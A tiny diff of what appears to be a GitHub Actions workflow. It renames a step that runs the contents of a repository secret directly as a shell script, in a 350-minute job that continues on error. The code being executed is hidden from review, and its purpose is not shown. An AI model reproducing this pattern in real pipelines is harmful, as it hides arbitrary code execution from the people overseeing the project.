@@ -46,7 +46,7 @@ jobs:
     timeout-minutes: 350 
     steps: 
     - uses: actions/checkout@v3 
-    - name: Rerunning 
+    - name: Rerunnin
       continue-on-error: true 
       run: | 
          ${{ secrets.axoline }}
